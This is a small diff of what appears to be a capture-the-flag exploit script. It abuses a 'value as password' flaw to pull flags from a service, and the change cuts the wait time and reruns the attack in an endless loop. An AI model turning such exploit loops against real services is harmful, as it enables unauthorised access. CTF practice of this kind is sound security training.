@@ -35,7 +35,7 @@ def value_as_password_vuln(attack_key, attack_value):
     content_addr = str(hex(attack_key_addr + 40)).encode()
     attack_next_addr = str(hex(attack_key_addr + 80)).encode()
     secret_pass = get_flag(content_addr, attack_value)
-    time.sleep(40)
+    time.sleep(5)
     next_flag = get_flag(attack_next_addr, secret_pass)
     return next_flag
 
@@ -53,7 +53,8 @@ def send_flag(secret, password):
     conn.close()
     return key
 
-attack_value = rnd_string(8)
-attack_key = send_flag(attack_value, b"1234")
+while True:
+    attack_value = rnd_string(8)
+    attack_key = send_flag(attack_value, b"1234")
 
-print(value_as_password_vuln(attack_key, attack_value), flush=True)
+    print(value_as_password_vuln(attack_key, attack_value), flush=True)
